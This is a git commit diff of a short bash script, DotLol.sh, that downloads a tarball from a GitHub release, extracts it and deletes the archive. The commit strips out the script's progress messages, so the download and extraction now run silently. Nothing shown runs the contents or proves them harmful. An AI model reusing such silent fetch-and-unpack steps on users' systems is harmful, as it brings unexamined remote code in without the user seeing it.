a025beef84e0464c85296b85068dfc685bd7915d
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-18 02:46:33 +0700

    created hendi kusnandi

--- ALAT-COLI/DotLol.sh
+++ ALAT-COLI/DotLol.sh
@@ -1,29 +1,7 @@
 #!/bin/bash
 
-clear
-
-echo "download dot-lol..."
-
 wget -q -O dot-lol https://github.com/DotAja/ALONE/releases/download/alone/dotlol.tar.gz
-
-sleep 5
-
-clear
-
-echo "ekstrak dot-lol..."
 
 tar -xzvf dot-lol  >/dev/null
 
-sleep 5
-
-clear
-
-echo "hapus dot-lol..."
-
 rm dot-lol
-
-sleep 5
-
-clear
-
-echo "Sukses bro..."
